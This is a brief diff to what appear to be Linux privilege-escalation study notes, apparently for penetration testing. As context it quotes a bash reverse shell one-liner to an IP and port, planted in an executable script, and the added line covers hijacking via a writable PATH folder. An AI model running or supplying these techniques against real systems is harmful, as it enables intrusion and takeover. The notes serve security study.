@@ -82,4 +82,4 @@ other tools like: LinEnum / LES (Linux exploit suggester) / Linux smart enumerat
 - Set up a reverse shell inside the script: `bash -i >& /dev/tcp/10.113.104.156/4545 0>&1`, and make sure the script is executable using chmod +x script.sh and set up a listener
 
 <span style="color:rgb(172, 57, 163)"><b>PATH:</b></span> 
-- 
+- If a folder for which your user has write permission is located in the path (`echo $PATH`), you could potentially hijack an application to run a script
